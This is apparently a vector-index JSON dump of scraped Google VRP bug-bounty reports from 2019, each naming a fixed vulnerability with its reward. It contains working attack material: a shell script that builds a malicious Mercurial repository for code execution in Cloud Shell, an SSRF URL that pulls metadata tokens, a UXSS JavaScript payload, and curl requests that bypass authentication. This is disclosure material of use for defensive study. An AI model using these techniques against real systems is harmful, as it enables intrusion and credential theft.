"last_modified_date": "2025-04-11"}, "hash": "78372b6b1051a3a51641d28b4be643013fbfb0388cf9cfad0a0adf3862f8b4ab", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://ssh.cloud.google.com/cloudshell/\r\nReported by:\r\nwtm\r\nGoogle VRP\r\ntriaged\r\n04:10 | Sep 20, 2019\r\naccepted\r\n17:04 | Sep 21, 2019\r\nfixed\r\n05:03 | Jan 8, 2020\r\nreward decided\r\n$5,000\r\nSummary: undocumented go_get_repo leads to code execution on cloudshell\r\nHey Google security team,\r\nIn the JS source code of cloudshell (\r\nhttps://www.gstatic.com/_/cloudshell/_/js/k=cloudshell.csh.nl.myP8e5tp8zw.O/d=1/rs=APXSEb_DWM6Igg927MPp712LbP5xcQR_Aw/m=cloudshell\r\n) i noticed an undocumented GET-parameter named 'go_get_repo'.\r\nAn attacker can abuse this parameter go gain code execution within the Cloudshell of the victim.\r\nSetting the go_get_repo GET parameter to \"go.offensi.com/go.html\" invokes the 'go get go.offensi.com/go.html' shell command within Cloudshell. By setting it to go.offensi.com/go.html i can force the go-client to read the metadata i provided. In go.offensi.com/go.html i'm specifying that my go files are being stored in a Mercurial/hg repo:\r\n\"<meta name=\"go-import\" content=\"go.offensi.com/go.html hg https://go.offensi.com/hgrepo/root\">\"\r\nThe malicious Mercurial repo on my server exploits a vulnerability in hg, which i discovered thanks to the use of Google Container Analysis running against a Cloudshell image i stored in gcr.io :) Debian 9 / Stretch is still vulnerable as can be seen here:\r\nhttps://security-tracker.debian.org/tracker/CVE-2019-3902\r\nSteps to reproduce:\r\nVictim opens\r\nhttps://ssh.cloud.google.com/cloudshell/editor?go_get_repo=go.offensi.com/go.html\r\nVictim clicks 'OK'\r\nCode is executed instantly  (the malicious repository writes a 'cut' binary to /home/<user>/gopath/bin, the 'cut' command is invoked in cloudshell_open after 'go get' has completed running). Ofcourse any writeable path on the filesystem can be chosen by modifying the evil repository.\r\nBrowser/OS: \r\nLatest Chrome /  Latest OSX\r\nI hope this helps!\r\nKind regards, \r\nOffensi.com\r\nWouter ter Maat\r\nps. Replicating the evil repository can be done like this:\r\n#!/bin/sh\r\n# PoC for Google VRP by wtm@offensi.com\r\nmkdir hgrepo\r\nhg init hgrepo/root\r\ncd hgrepo/root\r\nln -s ../../../bin\r\nhg ci -qAm 'add symlink \"bin\"'\r\nhg init ../../../bin\r\necho 'bin = bin' >> .hgsub\r\nhg ci -qAm 'add subrepo \"bin\"'\r\n\r\ncd ../../../bin\r\necho '#!/bin/sh' >> cut\r\necho 'wall You have been pwned!' >> cut\r\nchmod +x cut\r\nhg add cut\r\nhg commit -m \"evil cut bin\"\r\n\r\ncd /var/www/html/hgrepo/root\r\nhg commit -m \"final\"\r\n\r\n# now create the evil go.html file\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2519, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f4fa43b1-128e-4d9c-a420-fa30cf827c2c": {"__data__": {"id_": "f4fa43b1-128e-4d9c-a420-fa30cf827c2c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_701252.txt", "file_name": "20250408_175728_701252.txt", "file_type": "text/plain", "file_size": 1228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "24553444-4cde-44cf-beb3-a76982a7ed90", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_701252.txt", "file_name": "20250408_175728_701252.txt", "file_type": "text/plain", "file_size": 1228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "4c31d7a9569d1d70c58e62d34e1a4573f103c4a831c244a2229348c02e35e23a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://bugs.chromium.org/prpc\r\nReported by:\r\nJinseo Kim\r\nGoogle VRP\r\ntriaged\r\n16:33 | Sep 4, 2019\r\naccepted\r\n23:25 | Sep 5, 2019\r\nfixed\r\n04:32 | Sep 21, 2019\r\nreward decided\r\n$5,000\r\nSummary: Authentication Issue at Monorail API\r\nSteps to reproduce:\r\nCreate an OAuth Token at\r\nhttps://developers.google.com/oauthplayground/\r\n; with @google.com account\r\ncurl \"\r\nhttps://bugs.chromium.org/prpc/monorail.Users/GetUser\"\r\n--data '{\"userRef\":{\"displayName\":\"\r\ncontact@kjsman.me\r\n\"}}' -H \"Authorization: Bearer <OAUTH_TOKEN>\" -H \"Content-Type: application/json\" -H \"accept: application/json\"\r\nNotify that you don't need any XSRF token, and OAuth Playground is outside of Chromium Issue Tracker\r\nBrowser/OS: Any\r\nDetail: \r\nLook at this code:\r\nhttps://cs.chromium.org/chromium/infra/appengine/monorail/api/monorail_servicer.py?l=217\r\n. This allows any request of Googlers without XSRF token.\r\nAttack scenario:\r\nAny attacker may induce Googlers to login his site with google.com(only email scope is required). If the Googler sign in the attacker's site, The attacker can obtain full access as Googler's Chromium Issue Tracker Account.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1212, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1cfd17a9-f3f4-43f0-aa06-a2a745b15692": {"__data__": {"id_": "1cfd17a9-f3f4-43f0-aa06-a2a745b15692", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_764061.txt", "file_name": "20250408_175728_764061.txt", "file_type": "text/plain", "file_size": 1085, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "abd189f8-f5de-463e-9f7d-e4f63822aadc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_764061.txt", "file_name": "20250408_175728_764061.txt", "file_type": "text/plain", "file_size": 1085, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "732adbc30491e93eeadee3d5a125dde973273339e8ceb164a67d7d1e95f5d11e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://datastudio.google.com\r\nReported by:\r\nCarmelo Ventimiglia\r\nGoogle VRP\r\ntriaged\r\n15:40 | Sep 4, 2019\r\naccepted\r\n22:39 | Sep 5, 2019\r\nfixed\r\n05:12 | Oct 17, 2019\r\nreward decided\r\n$500\r\nSummary: Private report sharable link is leaked through referrer on DataStudio\r\nVideo proof:\r\nhttps://youtu.be/V7SBpi48Z3E\r\nSteps to reproduce:\r\nCreate a new report and create also a sharable link\r\nCreate any external link\r\nClick on the link.\r\nYou'll find the report url in the refer, like this one:\r\nhttps://datastudio.google.com/reporting/11mrjLgp2Es28443nB6U5c7b8vWNKDb2i/page/pDBz\r\nSimply drop the \"reporting\" part as well as the /page/pDBz, and replace it with /open/\r\nhttps://datastudio.google.com/open/11mrjLgp2Es28443nB6U5c7b8vWNKDb2i\r\nSharable link is leaked!\r\nBrowser/OS:\r\nAttack scenario:\r\nEveryone can exploit this vulnerability, listening for incoming request, saving the referral link and accessing to private data reports for any google datastudio user.\r\nWarnings shown:\r\nmusic_video\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1069, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "90e80038-3d01-4118-afdc-70235972c8b2": {"__data__": {"id_": "90e80038-3d01-4118-afdc-70235972c8b2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_795471.txt", "file_name": "20250408_175728_795471.txt", "file_type": "text/plain", "file_size": 1389, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "84c2e511-48ec-47ff-a7e5-23983f681b44", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_795471.txt", "file_name": "20250408_175728_795471.txt", "file_type": "text/plain", "file_size": 1389, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "67331705f14a3778299669c4977b87f20ff31dc4360ebfadebbc1e7c7230d7f2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://www.google.com/\r\nReported by:\r\nSayaan alam\r\nGoogle VRP\r\ntriaged\r\n04:19 | Aug 11, 2019\r\nclosed\r\n22:11 | Aug 14, 2019\r\naccepted\r\n23:17 | Sep 26, 2019\r\nfixed\r\n19:55 | Apr 9, 2020\r\ntriaged\r\n17:23 | Sep 9, 2020\r\nfixed\r\n15:40 | Sep 10, 2020\r\nreward decided\r\n$500\r\nSummary: Hii Google! I  found a vulnerability in google knowledge panel by which I can suggest an edit on behalf of the owner of the knowledge panel. If You Need More Help Or Video Then I am also ready for that.\r\nSteps to reproduce:\r\nGo To Your Own Knowledge Panel and Click On Suggest Edit\r\nNow Enter Your Suggestion and Before Clicking Send Intercept that request\r\nNow In The CID Field Change Your CID (Which is Followed by /g/ ) To The Attacker's CID\r\nNow We'll Observe That If A normal person send feedback to someone's knowledge panel then we'll get an email from -\r\nnoreply-ke-feedback@google.com\r\nBut If an Owner suggests edit then we got an email from -\r\nnoreply-feedback@google.com\r\nIn our case we are also getting an email from -\r\nnoreply-feedback@google.com\r\n, Even I am not the owner of that knowledge panel\r\nAttack scenario:\r\nA Regular User Can Make Edits To Celebrities Knowledge Panel\r\nAttacker Can disturb Googles' Search Information\r\nIt will ruin the reputation of google in terms of correct information\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1373, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "31debb55-00cc-4e2c-ac76-07dbe168fcee": {"__data__": {"id_": "31debb55-00cc-4e2c-ac76-07dbe168fcee", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_827011.txt", "file_name": "20250408_175728_827011.txt", "file_type": "text/plain", "file_size": 910, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0b0db083-274a-4440-a644-5638d7ee1546", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_827011.txt", "file_name": "20250408_175728_827011.txt", "file_type": "text/plain", "file_size": 910, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "f040f53c09b30a109734420ea1df268ef12a86d79f0de3136d99d95e5b9d7baf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://caja.appspot.com/playground/cajole (which Google owns)\r\nReported by:\r\nJinseo Kim\r\nGoogle VRP\r\naccepted\r\n19:37 | Aug 6, 2019\r\nfixed\r\n07:09 | Mar 7, 2020\r\nreward decided\r\n$2,337\r\nSummary: Metadata SSRF\r\nSteps to reproduce:\r\nEnter to\r\nhttps://caja.appspot.com/#http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token\r\nClick \"Load\"\r\nNotify that you can obtained access token.\r\nBrowser/OS: Any\r\nAttack scenario:\r\nAny user can obtain \"/auth/cloud-platform\" scope. It means any user can get read/write access to the project's internal information, code, interesting data, etc.\r\nThe feature seems to be broken(For example, you can't load\r\nhttps://www.google.com\r\n), so I couldn't explore more. Can you check out whether other endpoint/hosts could be loaded when it's fixed?\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 894, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "17422496-80be-4c7a-9193-eedeada76529": {"__data__": {"id_": "17422496-80be-4c7a-9193-eedeada76529", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_874805.txt", "file_name": "20250408_175728_874805.txt", "file_type": "text/plain", "file_size": 2229, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "dcf784b6-b3b1-438e-b1ec-fb58eb4100c9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_874805.txt", "file_name": "20250408_175728_874805.txt", "file_type": "text/plain", "file_size": 2229, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6e0de72b6e463fd73315e098c3058a1f9b1a5b0f3376cd87149b8b3575b668dc", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in User-Agent Switcher for Chrome\r\nReported by:\r\nJun Kokatsu\r\nGoogle VRP\r\naccepted\r\n19:42 | Jul 12, 2019\r\nfixed\r\n07:39 | Apr 12, 2020\r\nreward decided\r\n$5,000\r\nSummary: UXSS using User-Agent Switcher for Chrome\r\nSteps to reproduce:\r\nInstall\r\nhttps://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg/related\r\nGo to any web page (e.g. shhnjk.com) and open devtools\r\nChange JS context to User-Agent Switcher's content script and run\r\nchrome.extension.sendRequest({action: \"add_ua\", name: 'Edge', user_agent: \"Edge'+alert(origin)+'\", append_to_default_ua: true, indicator: 'Edge'})\r\nNow changes user agent to Default -> Edge\r\nGo to google.com and observe an alert\r\nBrowser/OS: Chrome/Windows 10\r\nAttack scenario:\r\nCompromised renderer can call content script APIs. There is a message listener in background script, and it allows setting arbitrary User Agent string.\r\nelse if (request.action == \"add_ua\") {\r\n        addCustomUAOption(request.name, request.user_agent, request.append_to_default_ua, request.indicator);\r\n        sendResponse({\r\n            result: \"success\"\r\n        });\r\n}\r\nWhen this new user agent is set, content script injected in <all_urls> will overwrite navigator.userAgent using followinf script.\r\nvar a = document.createElement(\"script\");\r\n        a.type = \"text/javascript\";\r\n        a.innerText += \"Object.defineProperty(window.navigator, 'userAgent', { get: function(){ return '\" + (b.append_to_default_ua ? navigator.userAgent + ' ' + b.ua_string : b.ua_string) + \"'; } });\";\r\n        a.innerText += \"Object.defineProperty(window.navigator, 'vendor', { get: function(){ return '\" + (b.vendor) + \"'; } });\";\r\n        if (b.platform) {\r\n            a.innerText += \"Object.defineProperty(window.navigator, 'platform', { get: function(){ return '\" + (b.platform) + \"'; } });\";\r\n        }\r\n        document.documentElement.insertBefore(a, document.documentElement.firstChild)\r\nXSS everywhere. When any website tries to call navigator.userAgent, new overwritten function will be called. And since many websites calls navigator.userAgent to detect user agent, this is an UXSS.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2213, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3b11a85b-a4be-4e96-8142-960782a52d9b": {"__data__": {"id_": "3b11a85b-a4be-4e96-8142-960782a52d9b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175730_979419.txt", "file_name": "20250408_175730_979419.txt", "file_type": "text/plain", "file_size": 1725, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c6f96e53-d21f-4f8e-980c-0291e4e94bf5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175730_979419.txt", "file_name": "20250408_175730_979419.txt", "file_type": "text/plain", "file_size": 1725, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "eeed8aafb5c2361067f70f403e238aa208a675faefec345858c365ac9b227ba6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://groups.google.com\r\nReported by:\r\nMaxime Escourbiac\r\nGoogle VRP\r\nclosed\r\n21:24 | Jun 11, 2019\r\naccepted\r\n18:03 | Jun 14, 2019\r\nfixed\r\n06:09 | Feb 6, 2020\r\nreward decided\r\n$5,000\r\nSummary: Some messages of restricted groups can be visible by using search feature of domain.\r\nGoogle group for a domain allows users to search content in groups or messages. By searching some text, the users is redirected to the url :\r\nhttps://groups.google.com/a/\r\n<domain>/forum/#!search/<text_to_search>.\r\nThis page displays all the visible messages matching the search request. However, I detected that some visible result cannot be accessible by directly navigating on it. (message or group which own the message).\r\nAn example among others, this url (\r\nhttps://groups.google.com/a/xm.com/forum/#!search/a%7Csort:date\r\n) allows \"anonymous users\" to see messages from \"HR GR\" or \"Chinese Coordinator\" group. By the way, the link of this group (\r\nhttps://groups.google.com/a/xm.com/forum/#!forum/hrgr\r\n) showed an error saying that i'm not authorized to see the group. I was able to see new messages coming to this group.\r\nThis behaviour appeared weeks ago on lot of public domain google groups. (\r\nhttps://groups.google.com/a/dennis.co.uk/forum/#!search/a\r\netc..) (I used to scan public groups as bug hunters).\r\nI was not able to explain this behaviour by a group privacy misconfiguration (searchable is not an option).\r\nSo i thought about kind of code regression this is why i posted that report.\r\nAttack scenario:\r\nAnonymous users can read the full message by made several search. (search of the last word of the visible extract).\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1709, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c5ceb470-30a7-4daf-9c40-96eac674818b": {"__data__": {"id_": "c5ceb470-30a7-4daf-9c40-96eac674818b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_011003.txt", "file_name": "20250408_175731_011003.txt", "file_type": "text/plain", "file_size": 1252, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e6df4fc4-db7f-4ceb-a609-7c9f924d9212", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_011003.txt", "file_name": "20250408_175731_011003.txt", "file_type": "text/plain", "file_size": 1252, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "ebced5c7a6dd95c161152b3a2294a776dcc1df7b8fa284674420bd985e94e47a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://drive.google.com\r\nReported by:\r\nAndrew Sirkin\r\nGoogle VRP\r\naccepted\r\n18:49 | May 23, 2019\r\nfixed\r\n04:58 | Jul 27, 2019\r\nreward decided\r\n$5,000\r\nSummary: 3rd parties able to download Google Form responses through Drive\r\nSteps to reproduce:\r\nCreate Test Data (or use this example data:\r\nhttps://drive.google.com/drive/folders/13pytRliHEcqP7Fe7zAQyop00GO51nLyY?usp=sharing\r\n)\r\nCreate a test document and a test form in Google Drive.\r\nClick on the form and put in some test data.\r\nPut those two items in a folder.\r\nShare the folder using a link.\r\nHave someone that was only given the link download multiple documents, one of which is the form (or use Download All).\r\nGoogle Drive creates a zip and downloads it; open that zip folder.\r\nOpen the enclosed folder, and go to the enclosed zip, which will be yourformname.zip\r\nInside yourformname.zip is a csv containing all responses to the form.\r\nAttack scenario:\r\nA user who has been granted View access to a folder containing a form can download the results of a form, instead of just the form itself. When sharing a form, it should not share the results of that form unless specifically selected.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1236, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "57952a95-4738-4ef8-9899-eb254b72bc0e": {"__data__": {"id_": "57952a95-4738-4ef8-9899-eb254b72bc0e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.txt", "file_name": "20250408_175731_064402.txt", "file_type": "text/plain", "file_size": 5287, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1759b7f5-441f-421f-a9fd-2ccffaa785f8", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.txt", "file_name": "20250408_175731_064402.txt", "file_type": "text/plain", "file_size": 5287, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "e5919e3bf1db42b7970a53ff82f0fa4b3402069621b8ab41322561be931e7b10", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "247db873-5d5f-43a0-91ed-1c19d69fa406", "node_type": "1", "metadata": {}, "hash": "815e0a8dea338cce47a100db534365a4717cbef834885ba2e42563263b96a480", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in GCR\r\nGoogle VRP\r\naccepted\r\n23:15 | Apr 30, 2019\r\nfixed\r\n08:44 | Jul 4, 2019\r\nreward decided\r\n$5,000\r\nSummary: Ability to delete GCR repositories from a project, from a node without the scopes to do it.\r\nA copy of the report (130287976) to change the reporter e-mail.\r\n---------------------------------------------------------------------- CASE SUBJECT ----------------------------------------------------------------------\r\nGCR API allows r/w bucket access for an IAM service account in a GKE container process, while Cloud Storage API should deny it for that account, according to GKE node's OAuth scope\r\n---------------------------------------------------------------------- CASE DESCRIPTION ----------------------------------------------------------------------\r\nWe observe a possible bucket access issue via GCR API. Here's an example in details:\r\nThe project's \"Compute Engine default service account\" (\r\n168590553477-compute@developer.gserviceaccount.com\r\nin this case) has an \"Editor\" role in IAM.\r\nGKE Kubernetes cluster nodes in that project are created using this very \"Compute Engine default service account\".\r\nWe limit the GKE node's OAuth scopes to the following 6 only:\r\nhttps://www.googleapis.com/auth/devstorage.read_only\r\nhttps://www.googleapis.com/auth/monitoring\r\nhttps://www.googleapis.com/auth/logging.write\r\nhttps://www.googleapis.com/auth/service.management.readonly\r\nhttps://www.googleapis.com/auth/servicecontrol\r\nhttps://www.googleapis.com/auth/trace.append\r\nIn that same project we have a GCR bucket, with access rights as follows:\r\n$ gsutil iam get gs://artifacts.egnyteprotect-automation.appspot.com \r\n{ \r\n\"bindings\": [ \r\n{ \r\n\"members\": [ \r\n\"projectEditor:egnyteprotect-automation\", \r\n\"projectOwner:egnyteprotect-automation\" \r\n], \r\n\"role\": \"roles/storage.legacyBucketOwner\" \r\n}, \r\n{ \r\n\"members\": [ \r\n\"projectViewer:egnyteprotect-automation\" \r\n], \r\n\"role\": \"roles/storage.legacyBucketReader\" \r\n} \r\n], \r\n\"etag\": \"CAE=\" \r\n}\r\nIn spite of read-only Cloud Storage API access, set as per the node's OAuth scopes above, the \"Compute Engine default service account\" grants read-write bucket access via GCR API for processes in a GKE container - as with the following\r\ngcloud container images delete\r\ncommand ran in a GKE container:\r\ngcloud --format=yaml auth list \r\n--- \r\naccount: 168590553477-compute@developer.gserviceaccount.com \r\nstatus: ACTIVE\r\ngcloud container images delete --quiet --force-delete-tags gcr.io/egnyteprotect-automation/business-analysis-sql-slurper:0.0.1-SNAPSHOT \r\nDigests: \r\n- gcr.io/egnyteprotect-automation/business-analysis-sql-slurper@sha256:3238d6603af4e7229a41dcb6abfc8bbf50ecfe4e2236de52c7e86f451e3cd599 \r\nAssociated tags: \r\n- 0.0.1-SNAPSHOT \r\nTags: \r\n- gcr.io/egnyteprotect-automation/business-analysis-sql-slurper:0.0.1-SNAPSHOT \r\nDeleted [gcr.io/egnyteprotect-automation/business-analysis-sql-slurper:0.0.1-SNAPSHOT]. \r\nDeleted [gcr.io/egnyteprotect-automation/business-analysis-sql-slurper@sha256:3238d6603af4e7229a41dcb6abfc8bbf50ecfe4e2236de52c7e86f451e3cd599].\r\nSo it seems that the GCR bucket's \"projectEditor:egnyteprotect-automation\" \"roles/storage.legacyBucketOwner\" binding takes precedence over the \"devstorage.read_only\" GKE node's OAuth scope for processes in a GKE container. But, a GCR bucket is still also a Cloud Storage bucket, so I'd rather expect a container process which tries to access a GCR bucket, no matter if that's via Cloud Storage or GCR API, to be limited by the Cloud Storage OAuth scope set on a GKE node. Am I missing something?\r\n---------------------------------------------------------------------- /CASE DESCRIPTION ----------------------------------------------------------------------\r\nThe way to achieve this is:\r\n---------------------------------------------------------------------- REPRODUCTION STEPS ----------------------------------------------------------------------\r\n1 - Create GKE cluster\r\ngcloud container clusters create testcluster-scoped --zone europe-west2-c --scopes=gke-default\r\nWhere the scopes are set to the same as the customer tags. The cluster uses the default service account for Compute, which by default has Editor role.\r\n2 - Create test GCR repository.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4233, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "247db873-5d5f-43a0-91ed-1c19d69fa406": {"__data__": {"id_": "247db873-5d5f-43a0-91ed-1c19d69fa406", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.txt", "file_name": "20250408_175731_064402.txt", "file_type": "text/plain", "file_size": 5287, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1759b7f5-441f-421f-a9fd-2ccffaa785f8", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.txt", "file_name": "20250408_175731_064402.txt", "file_type": "text/plain", "file_size": 5287, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "e5919e3bf1db42b7970a53ff82f0fa4b3402069621b8ab41322561be931e7b10", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "57952a95-4738-4ef8-9899-eb254b72bc0e", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.txt", "file_name": "20250408_175731_064402.txt", "file_type": "text/plain", "file_size": 5287, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "77775e5f5f76f42fedd7ff09eab84c7be1e5966c721f9d862d345da3063d82df", 